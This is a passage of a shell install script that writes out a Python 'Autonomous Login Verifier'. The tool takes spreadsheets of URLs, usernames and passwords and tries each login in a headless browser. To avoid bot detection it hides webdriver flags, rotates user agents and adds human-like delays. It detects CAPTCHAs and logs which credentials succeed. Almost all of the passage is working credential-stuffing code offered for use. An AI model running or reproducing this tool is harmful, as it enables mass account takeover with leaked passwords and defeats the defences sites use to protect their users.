    for idx, ua in enumerate(group_uas[:20]):  # Limit display to 20 for brevity
        truncated = ua[:50] + "..." if len(ua) > 50 else ua
        table.add_row(str(idx + 1), truncated)

    console.print(table)
    console.print("[dim]Note: Full list available, showing first 20.[/dim]")
    
    try:
        selection = IntPrompt.ask("[bold green]Select UA # (or 0 for random in group): [/bold green]")
        if selection == 0:
            return random.choice(group_uas)
        elif 1 <= selection <= len(group_uas):
            return group_uas[selection - 1]
        else:
            console.print("[red]Invalid selection. Using random.[/red]")
            return random.choice(group_uas)
    except ValueError:
        console.print("[red]Please enter a number.[/red]")
        return random.choice(group_uas)

def attempt_login(url, username, password, user_agent=None):
    """
    Autonomous Login Attempt using Selenium with anti-detection and optional fixed UA.
    Returns (success: bool, message: str)
    """
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    ua = user_agent or random.choice(ALL_USER_AGENTS)
    options = uc.ChromeOptions()
    options.add_argument(f'--user-agent={ua}')
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    driver = None
    try:
        driver = uc.Chrome(options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        driver.get(url)
        wait = WebDriverWait(driver, 10)
        
        # Username selectors (prioritized)
        username_selectors = [
            'input[name="username"]', 'input[name="email"]', 'input[id="username"]',
            'input[placeholder*="user"]', 'input[placeholder*="email"]', '#username', '#email', '#user', '.username'
        ]
        password_selectors = [
            'input[name="password"]', 'input[type="password"]', '#password', '.password'
        ]
        submit_selectors = [
            'input[type="submit"]', 'button[type="submit"]', '#login', '.btn-login', 'button[name="submit"]', '.login-button'
        ]
        
        username_elem = None
        for sel in username_selectors:
            try:
                username_elem = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, sel)))
                break
            except TimeoutException:
                continue
        
        if not username_elem:
            return False, "No username/email field found"
        
        password_elem = None
        for sel in password_selectors:
            try:
                password_elem = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, sel)))
                break
            except TimeoutException:
                continue
        
        if not password_elem:
            return False, "No password field found"
        
        submit_elem = None
        for sel in submit_selectors:
            try:
                submit_elem = driver.find_element(By.CSS_SELECTOR, sel)
                break
            except NoSuchElementException:
                continue
        
        if not submit_elem:
            return False, "No submit button found"
        
        # Random delay to mimic human
        time.sleep(random.uniform(1, 3))
        
        username_elem.clear()
        username_elem.send_keys(username)
        password_elem.clear()
        password_elem.send_keys(password)
        
        time.sleep(random.uniform(0.5, 1.5))
        submit_elem.click()
        
        # Wait for response
        time.sleep(5)
        
        # Check for CAPTCHA
        if driver.find_elements(By.CSS_SELECTOR, 'iframe[src*="recaptcha"], .g-recaptcha'):
            return False, "CAPTCHA encountered (manual intervention required)"
        
        # Check for errors
        page_source_lower = driver.page_source.lower()
        error_keywords = ['invalid', 'wrong', 'error', 'failed', 'incorrect', 'denied', 'unauthorized']
        if any(keyword in page_source_lower for keyword in error_keywords):
            # Extract specific message
            error_selectors = ['.error', '.alert-danger', '.alert-error', '#error-message', '[class*="error"]', '[class*="alert"]']
            error_msg = "Login failed (generic error)"
            for sel in error_selectors:
                try:
                    error_elem = driver.find_element(By.CSS_SELECTOR, sel)
                    error_msg = error_elem.text.strip() or error_msg
                    break
                except NoSuchElementException:
                    continue
            return False, error_msg
        
        # Check for success indicators
        current_url = driver.current_url
        title = driver.title.lower()
        success_indicators = ['dashboard', 'welcome', 'home', 'profile', 'account']
        if any(indicator in current_url.lower() or indicator in title for indicator in success_indicators):
            return True, "Login successful - redirected to dashboard"
        
        # Fallback: if not on login page anymore and no error
        if current_url != url and 'login' not in current_url.lower():
            return True, f"Login successful - redirected to {current_url}"
        
        return False, "Uncertain outcome - no clear success or failure detected"
        
    except WebDriverException as e:
        return False, f"Browser error: {str(e)[:50]}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)[:50]}"
    finally:
        if driver:
            driver.quit()

# --- Core Logic ---
def perform_placeholder():
    clear_screen()
    print_banner("Placeholder")
    console.print(Panel("[bold green]Hello, Placeholder![/bold green]", expand=False))
    
    while True:
        choice = console.input("\n[bold yellow]Options: (0) Restart Tool  (1) Quit : [/bold yellow]")
        if choice == '0':
            return "restart"
        elif choice == '1':
            return "quit"

def perform_verification(filepath, mode="automated", selected_entry=None, selected_ua=None):
    clear_screen()
    print_banner("Verification")
    
    console.print(f"[dim]Initializing {mode.upper()} Login Verification on: {filepath}[/dim]")
    df = load_file(filepath)
    if df is None:
        console.input("[bold red]Press Enter to return...[/bold red]")
        return "restart"

    # Normalize headers
    df.columns = df.columns.str.lower().str.strip()
    
    # Validate Columns
    required_cols = {'name', 'url', 'username', 'password', 'note'}
    missing_cols = required_cols - set(df.columns)
    if missing_cols:
        console.print(f"[bold red]Error:[/bold red] File is missing required columns: {missing_cols}")
        console.input("[bold red]Press Enter to return...[/bold red]")
        return "restart"

    results = []
    successful = []
    failed = []
    
    if mode == "sniper" and selected_entry is not None:
        # Single entry processing
        entries = [selected_entry]
    else:
        entries = df.to_dict('records')
    
    # Initial inspection
    console.print(f"[bold blue]Performing {'single sniper' if mode == 'sniper' else 'full'} deep inspection...[/bold blue]\n")
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.percentage:>3.0f}%"),
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Inspecting Targets...", total=len(entries))
        for entry in entries:
            name = str(entry.get('name', 'Unknown'))
            url = str(entry.get('url', ''))
            username = str(entry.get('username', ''))
            password = str(entry.get('password', ''))
            
            status, final_url, is_login, title = analyze_target(url, selected_ua if mode == "sniper" else None)
            
            # Only attempt login if login form detected
            if is_login:
                success, message = attempt_login(final_url, username, password, selected_ua if mode == "sniper" else None)
                result_entry = {
                    "name": name,
                    "url": final_url,
                    "username": username,
                    "success": success,
                    "message": message,
                    "title": title
                }
                if success:
                    successful.append(result_entry)
                else:
                    failed.append(result_entry)
            else:
                result_entry = {
                    "name": name,
                    "url": final_url,
                    "username": '',
                    "success": False,
                    "message": "No login form detected",
                    "title": title
                }
                failed.append(result_entry)
            
            results.append(result_entry)
            
            # Log
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, "a", encoding='utf-8') as f:
                log_msg = f"[{timestamp}] {name} | URL: {final_url} | Username: {result_entry['username']} | Success: {result_entry['success']} | Message: {message} | Title: {title} | Mode: {mode}\n"
                f.write(log_msg)
            
            progress.advance(task)

    # Display Results
    clear_screen()
    print_banner(f"{mode.upper()} Verification Results")
    
    # Successful Logins Table
    if successful:
        success_table = Table(title="Successful Logins", show_header=True)
        success_table.add_column("Name", style="cyan", no_wrap=True)
        success_table.add_column("URL", style="dim white")
        success_table.add_column("Username", style="green")
        success_table.add_column("Message", style="bold green")
        
        for res in successful:
            success_table.add_row(
                res['name'],
                res['url'],
                res['username'],
                res['message']
            )
        console.print(success_table)
    else:
        console.print(Panel("[bold yellow]No successful logins found.[/bold yellow]", title="Successful Logins"))
    
    console.print(f"\n[bold green]Total Successful: {len(successful)}[/bold green]")
    
    # Failed Attempts Table
    if failed:
        fail_table = Table(title="Failed Attempts", show_header=True)
        fail_table.add_column("Name", style="cyan", no_wrap=True)
        fail_table.add_column("URL", style="dim white")
        fail_table.add_column("Username", style="red")
        fail_table.add_column("Error Message", style="bold red")
        
        for res in failed:
            fail_table.add_row(
                res['name'],
                res['url'],
                res['username'],
                res['message']
            )
        console.print(fail_table)
    else:
        console.print(Panel("[bold green]No failed attempts.[/bold green]", title="Failed Attempts"))
    
    console.print(f"\n[bold red]Total Failed: {len(failed)}[/bold red]")
    console.print(f"[dim]Full logs saved to {LOG_FILE}[/dim]")

    while True:
        choice = console.input("\n[bold yellow]Options: (0) Restart Tool  (1) Quit : [/bold yellow]")
        if choice == '0':
            return "restart"
        elif choice == '1':
            return "quit"

# --- Main Loop ---
def main():
    # Clear log file on start
    open(LOG_FILE, 'w').close()
    
    while True:
        clear_screen()
        print_banner("csvicsvu")
        console.print("[bold white on blue] Autonomous Login Verifier [/bold white on blue]\n", justify="center")
        
        console.print(f"[bold cyan]Scanning for database files in: {os.getcwd()}[/bold cyan]")
        files = find_database_files(os.getcwd())
        
        if not files:
            console.print("[bold red]No .csv or .xlsx files found![/bold red]")
            choice = console.input("[bold yellow]Press Enter to retry or (1) to Quit: [/bold yellow]")
            if choice == '1':
                sys.exit()
            continue

        # Display File Menu
        file_table = Table(show_header=True, header_style="bold magenta")
        file_table.add_column("#", style="dim", width=4)
        file_table.add_column("File Path", style="cyan")

        for idx, f in enumerate(files):
            file_table.add_row(str(idx + 1), f)

        console.print(file_table)
        
        # Select File
        try:
            selection = console.input("\n[bold green]Select a file # to process: [/bold green]")
            if not selection:
                continue
            file_index = int(selection) - 1
            if 0 <= file_index < len(files):
                selected_file = files[file_index]
            else:
                console.print("[red]Invalid selection.[/red]")
                time.sleep(1)
                continue
        except ValueError:
            console.print("[red]Please enter a number.[/red]")
            time.sleep(1)
            continue

        # Select Action
        console.print("\n[bold underline]Select Action:[/bold underline]")
        console.print("1) Verification (Autonomous Login Check)")
        console.print("2) Placeholder")
        
        action = console.input("\n[bold green]Choice: [/bold green]")
        
        next_step = ""
        if action == '1':
            # Mode selection
            mode = Prompt.ask("\n[bold green]Mode: 1) Automated  2) Sniper : [/bold green]", choices=["1", "2"])
            if mode == "1":
                next_step = perform_verification(selected_file, "automated")
            else:
                df = load_file(selected_file)
                if df is not None:
                    entry = select_sniper_entry(df)
                    if entry is not None:
                        ua = select_sniper_ua()
                        next_step = perform_verification(selected_file, "sniper", entry, ua)
                    else:
                        continue
                else:
                    continue
        elif action == '2':
            next_step = perform_placeholder()
        else:
            console.print("[red]Invalid action.[/red]")
            time.sleep(1)
            continue
            
        if next_step == "quit":
            console.print("[bold blue]Goodbye![/bold blue]")
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]Interrupted by user. Exiting...[/bold red]")
        sys.exit()
    except Exception as e:
        console.print(f"[bold red]Unexpected error: {e}[/bold red]")
        sys.exit(1)
EOF

# 5. Make Executable
chmod +x csvicsvu.py
echo "[*] Setup complete!"
echo "[*] To run: source venv/bin/activate && python csvicsvu.py"
echo "-----------------------------------------------------"
